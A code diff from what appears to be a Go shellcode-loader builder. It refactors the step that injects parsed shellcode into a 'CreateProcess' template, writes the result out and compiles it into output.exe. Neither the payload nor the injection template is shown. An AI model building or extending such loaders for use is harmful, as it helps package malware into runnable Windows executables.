@@ -11,21 +11,8 @@ import (
 )
 
 func main() {
-	_ = os.RemoveAll(filepath.Join(".", "output.exe"))
 	shellcode := parseShellCode()
-	template, _ := ioutil.ReadFile("core/CreateProcess.go")
-	finalCode := strings.ReplaceAll(string(template), "__SHELLCODE__", shellcode)
-	newPath := filepath.Join(".", "output")
-	_ = os.MkdirAll(newPath, os.ModePerm)
-	_ = ioutil.WriteFile("output/main.go", []byte(finalCode), 0777)
-	cmd := exec.Command("cmd", "/c", "go build -o output.exe output/main.go")
-	err := cmd.Run()
-	if err == nil {
-		fmt.Println("go build success")
-	} else {
-		fmt.Println("go build error")
-	}
-	_ = os.RemoveAll(newPath)
+	build(shellcode)
 }
 
 func parseShellCode() string {
@@ -45,4 +32,21 @@ func parseShellCode() string {
 		buf.Write([]byte(temp))
 	}
 	return buf.String()
+}
+
+func build(shellcode string) {
+	_ = os.RemoveAll(filepath.Join(".", "output.exe"))
+	template, _ := ioutil.ReadFile("core/CreateProcess.go")
+	finalCode := strings.ReplaceAll(string(template), "__SHELLCODE__", shellcode)
+	newPath := filepath.Join(".", "output")
+	_ = os.MkdirAll(newPath, os.ModePerm)
+	_ = ioutil.WriteFile("output/main.go", []byte(finalCode), 0777)
+	cmd := exec.Command("cmd", "/c", "go build -o output.exe output/main.go")
+	err := cmd.Run()
+	if err == nil {
+		fmt.Println("go build success")
+	} else {
+		fmt.Println("go build error")
+	}
+	_ = os.RemoveAll(newPath)
 }
